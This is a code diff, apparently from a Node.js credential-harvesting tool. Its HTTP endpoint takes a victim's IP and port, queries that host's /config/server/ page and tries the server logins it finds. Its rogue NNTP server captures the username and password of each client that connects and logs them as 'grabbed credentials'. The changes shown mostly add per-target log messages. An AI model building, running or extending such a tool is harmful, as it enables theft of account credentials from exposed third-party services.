@@ -70,19 +70,29 @@ Disallow: /`);
 httpServer.get("/:target", async (request) => {
 	const { target } = request.params;
 	credentials[target.split(":")[0]] = [];
-	const baseUrl = `http://${target}`;
 	if (!target.match(/[0-9]+(?:\.[0-9]+){3}:[0-9]+/)?.length) {
+		console.log(
+			chalk.red.bold(
+				`  │ [http] invalid ip address passed. (${target.split(":")[0]})`,
+			),
+		);
 		return {
 			error: true,
 			data: {
 				message: "Invalid IP Address",
 			},
 		};
-	}
+	};
+	const baseUrl = `http://${target}`;
 
 	console.log(chalk.green(`+ [http] (${target.split(":")[0]}) new target`));
 	const [error, body] = await bRequest(`${baseUrl}/config/server/`);
 	if (error) {
+		console.log(
+			chalk.red.bold(
+				`  │ [http] (${target.split(":")[0]}) error. (${error})`,
+			),
+		);
 		return {
 			error: true,
 			data: {
@@ -156,7 +166,7 @@ httpServer.get("/:target", async (request) => {
 			) {
 				console.log(
 					chalk.red.bold(
-						`  │ [http] username and password is invalid, skipping. (${server.host.toLowerCase()})`,
+						`  │ [http] (${target.split(":")[0]}) username and password is invalid, skipping. (${server.host.toLowerCase()})`,
 					),
 				);
 				break;
@@ -165,7 +175,7 @@ httpServer.get("/:target", async (request) => {
 			if (!result) {
 				console.log(
 					chalk.red.bold(
-						`  │ [http] failed. (${server.host.toLowerCase()}:${port} | ${message.trim()})`,
+						`  │ [http] (${target.split(":")[0]}) failed. (${server.host.toLowerCase()}:${port} | ${message.trim()})`,
 					),
 				);
 				continue;
@@ -174,7 +184,7 @@ httpServer.get("/:target", async (request) => {
 			skipServer = false;
 			console.log(
 				chalk.green.bold(
-					`  │ [http] connection successful (${server.host.toLowerCase()})`,
+					`  │ [http] (${target.split(":")[0]}) valid credentials, connected successfully (${server.host.toLowerCase()})`,
 				),
 			);
 			break;
@@ -251,10 +261,10 @@ nntpServer.on("connection", (socket) => {
 			].password = value.trim();
 			clearTimeout(timeout);
 			socket.destroy();
-			console.log(chalk.blue.bold("  │      [nntp] grabbed credentials:"));
+			console.log(chalk.blue.bold(`  │      [nntp] (${socket.remoteAddress}) grabbed credentials:`));
 			console.log(
 				chalk.blue(
-					`  │        [nntp] username: ${
+					`  │        [nntp] (${socket.remoteAddress}) username: ${
 						credentials[credentialKey][credentials[credentialKey].length - 1]
 							.username
 					}`,
@@ -262,7 +272,7 @@ nntpServer.on("connection", (socket) => {
 			);
 			console.log(
 				chalk.blue(
-					`  │        [nntp] password: ${
+					`  │        [nntp] (${socket.remoteAddress}) password: ${
 						credentials[credentialKey][credentials[credentialKey].length - 1]
 							.password
 					}`,
